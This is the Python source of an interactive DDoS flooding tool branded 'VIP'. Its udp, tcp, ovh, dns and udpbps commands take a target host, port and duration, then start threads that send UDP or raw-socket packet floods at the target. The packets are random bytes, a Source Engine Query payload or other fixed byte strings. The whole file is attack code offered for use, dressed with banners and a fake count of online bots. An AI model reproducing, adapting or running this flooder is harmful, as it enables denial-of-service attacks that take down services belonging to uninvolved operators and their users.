#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import urllib
import json

nicknm = "BootsVip"
pen = """
\033[37m ============================
\033[37m = WARNING DONT ABUSE TOOLS =
\033[37m = DONT RENAME TOOLS YA KID =
\033[37m ============================
"""
banner =  """
        \033[37m╦ ╦╦╔═╗╔═╗\033[33m╦  ╦╦╔═╗
        \033[37m║║║║╔═╝╔═╝\033[33m╚╗╔╝║╠═╝
        \033[37m╚╩╝╩╚═╝╚═╝\033[33m ╚╝ ╩╩  
\033[0mLIST
- udp
- udpbps
- ovh
- dns
- tcp
"""

cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 0
uaid = 0
said = 0
running = 0
iaid = 0
haid = 0
aid = 0
attack = True
ldap = True
http = True
atks = 0

def randsender(host, timer, port, punch):
	global iaid
	global aid
	global tattacks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	running += 1
	while time.time() < timeout and ldap and attack:
		sock.sendto(punch, (host, int(port)))
	running -= 1
	iaid -= 1
	aid -= 1


def stdsender(host, port, timer, payload):
	global atks
	global running

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	atks += 1
	running += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	atks -= 1
	running -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global running
	global atk
	global ldap
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp

	while True:
		bots = (random.randint(666,2109))
		sys.stdout.write("\x1b]2;VIP | Uptime: [{}] | Boots Online [10] | Online User [100] | Clients: [5]\x07".format (bots))
		sin = input("\033[36m[\033[36m{}\033[37m@VIP\033[36m]\033[32m$ \033[36m".format(nicknm)).lower()
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			print (banner)
			print (pen)
			main()
		elif sinput == "":
			main()
		elif sinput == "exit":
			os.system ("clear")
			exit()
		elif sinput == "ovh":
			try:
				if running >= 1:
					print("\033[37mBatas Deck")
					main()
				else:
						sinput, host, timer, port = sin.split(" ")
						socket.gethostbyname(host)
						payload = b"\x00\x02\x00\x2f"
						threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
						print("""\033[37m ██▓███   ▄▄▄       ██ ▄█▀▓█████▄▄▄█████▓    ▒█████  ▄▄▄█████▓ █     █░
▓██░  ██▒▒████▄     ██▄█▒ ▓█   ▀▓  ██▒ ▓▒   ▒██▒  ██▒▓  ██▒ ▓▒▓█░ █ ░█░
▓██░ ██▓▒▒██  ▀█▄  ▓███▄░ ▒███  ▒ ▓██░ ▒░   ▒██░  ██▒▒ ▓██░ ▒░▒█░ █ ░█ 
▒██▄█▓▒ ▒░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄░ ▓██▓ ░    ▒██   ██░░ ▓██▓ ░ ░█░ █ ░█ 
▒██▒ ░  ░ ▓█   ▓██▒▒██▒ █▄░▒████▒ ▒██▒ ░    ░ ████▓▒░  ▒██▒ ░ ░░██▒██▓ 
▒▓▒░ ░  ░ ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░ ▒ ░░      ░ ▒░▒░▒░   ▒ ░░   ░ ▓░▒ ▒  
░▒ ░       ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░   ░         ░ ▒ ▒░     ░      ▒ ░ ░  
░░         ░   ▒   ░ ░░ ░    ░    ░         ░ ░ ░ ▒    ░        ░   ░  
               ░  ░░  ░      ░  ░               ░ ░               ░    """)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "dns":
			try:
				if running >= 1:
					print("\033[37mBatas Deck")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
					threading.Thread(target=stdsender, args=(host, port, timer, payload)).start()
					print("""\033[37m ██▓███   ▄▄▄       ██ ▄█▀▓█████▄▄▄█████▓    ▒█████  ▄▄▄█████▓ █     █░
▓██░  ██▒▒████▄     ██▄█▒ ▓█   ▀▓  ██▒ ▓▒   ▒██▒  ██▒▓  ██▒ ▓▒▓█░ █ ░█░
▓██░ ██▓▒▒██  ▀█▄  ▓███▄░ ▒███  ▒ ▓██░ ▒░   ▒██░  ██▒▒ ▓██░ ▒░▒█░ █ ░█ 
▒██▄█▓▒ ▒░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄░ ▓██▓ ░    ▒██   ██░░ ▓██▓ ░ ░█░ █ ░█ 
▒██▒ ░  ░ ▓█   ▓██▒▒██▒ █▄░▒████▒ ▒██▒ ░    ░ ████▓▒░  ▒██▒ ░ ░░██▒██▓ 
▒▓▒░ ░  ░ ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░ ▒ ░░      ░ ▒░▒░▒░   ▒ ░░   ░ ▓░▒ ▒  
░▒ ░       ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░   ░         ░ ▒ ▒░     ░      ▒ ░ ░  
░░         ░   ▒   ░ ░░ ░    ░    ░         ░ ░ ░ ▒    ░        ░   ░  
               ░  ░░  ░      ░  ░               ░ ░               ░    """)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udp":
			try:
				if running >= 1:
					print("\033[37mBatas Deck")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 1260
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""\033[37m ██▓███   ▄▄▄       ██ ▄█▀▓█████▄▄▄█████▓    ▒█████  ▄▄▄█████▓ █     █░
▓██░  ██▒▒████▄     ██▄█▒ ▓█   ▀▓  ██▒ ▓▒   ▒██▒  ██▒▓  ██▒ ▓▒▓█░ █ ░█░
▓██░ ██▓▒▒██  ▀█▄  ▓███▄░ ▒███  ▒ ▓██░ ▒░   ▒██░  ██▒▒ ▓██░ ▒░▒█░ █ ░█ 
▒██▄█▓▒ ▒░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄░ ▓██▓ ░    ▒██   ██░░ ▓██▓ ░ ░█░ █ ░█ 
▒██▒ ░  ░ ▓█   ▓██▒▒██▒ █▄░▒████▒ ▒██▒ ░    ░ ████▓▒░  ▒██▒ ░ ░░██▒██▓ 
▒▓▒░ ░  ░ ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░ ▒ ░░      ░ ▒░▒░▒░   ▒ ░░   ░ ▓░▒ ▒  
░▒ ░       ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░   ░         ░ ▒ ▒░     ░      ▒ ░ ░  
░░         ░   ▒   ░ ░░ ░    ░    ░         ░ ░ ░ ▒    ░        ░   ░  
               ░  ░░  ░      ░  ░               ░ ░               ░    """)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "tcp":
			try:
				if running >= 1:
					print("\033[37mBatas Deck")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					pack = 4097
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, timer, port, punch)).start()
					print("""\033[37m ██▓███   ▄▄▄       ██ ▄█▀▓█████▄▄▄█████▓    ▒█████  ▄▄▄█████▓ █     █░
▓██░  ██▒▒████▄     ██▄█▒ ▓█   ▀▓  ██▒ ▓▒   ▒██▒  ██▒▓  ██▒ ▓▒▓█░ █ ░█░
▓██░ ██▓▒▒██  ▀█▄  ▓███▄░ ▒███  ▒ ▓██░ ▒░   ▒██░  ██▒▒ ▓██░ ▒░▒█░ █ ░█ 
▒██▄█▓▒ ▒░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄░ ▓██▓ ░    ▒██   ██░░ ▓██▓ ░ ░█░ █ ░█ 
▒██▒ ░  ░ ▓█   ▓██▒▒██▒ █▄░▒████▒ ▒██▒ ░    ░ ████▓▒░  ▒██▒ ░ ░░██▒██▓ 
▒▓▒░ ░  ░ ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░ ▒ ░░      ░ ▒░▒░▒░   ▒ ░░   ░ ▓░▒ ▒  
░▒ ░       ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░   ░         ░ ▒ ▒░     ░      ▒ ░ ░  
░░         ░   ▒   ░ ░░ ░    ░    ░         ░ ░ ░ ▒    ░        ░   ░  
               ░  ░░  ░      ░  ░               ░ ░               ░    """)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "udpbps":
			try:
				if running >= 1:
					print("\033[37mBatas Deck")
					main()
				else:
					sinput, host, timer, port = sin.split(" ")
					socket.gethostbyname(host)
					payload = b"\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58\x99\x21\x58"
					threading.Thread(target=randsender, args=(host, timer, port, payload)).start()
					print("""\033[37m ██▓███   ▄▄▄       ██ ▄█▀▓█████▄▄▄█████▓    ▒█████  ▄▄▄█████▓ █     █░
▓██░  ██▒▒████▄     ██▄█▒ ▓█   ▀▓  ██▒ ▓▒   ▒██▒  ██▒▓  ██▒ ▓▒▓█░ █ ░█░
▓██░ ██▓▒▒██  ▀█▄  ▓███▄░ ▒███  ▒ ▓██░ ▒░   ▒██░  ██▒▒ ▓██░ ▒░▒█░ █ ░█ 
▒██▄█▓▒ ▒░██▄▄▄▄██ ▓██ █▄ ▒▓█  ▄░ ▓██▓ ░    ▒██   ██░░ ▓██▓ ░ ░█░ █ ░█ 
▒██▒ ░  ░ ▓█   ▓██▒▒██▒ █▄░▒████▒ ▒██▒ ░    ░ ████▓▒░  ▒██▒ ░ ░░██▒██▓ 
▒▓▒░ ░  ░ ▒▒   ▓▒█░▒ ▒▒ ▓▒░░ ▒░ ░ ▒ ░░      ░ ▒░▒░▒░   ▒ ░░   ░ ▓░▒ ▒  
░▒ ░       ▒   ▒▒ ░░ ░▒ ▒░ ░ ░  ░   ░         ░ ▒ ▒░     ░      ▒ ░ ░  
░░         ░   ▒   ░ ░░ ░    ░    ░         ░ ░ ░ ▒    ░        ░   ░  
               ░  ░░  ░      ░  ░               ░ ░               ░    """)
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif sinput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif sinput == "stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			main()


try:
	clear = "clear"
	os.system(clear)
	print(banner)
	main()
except KeyboardInterrupt:
	exit()
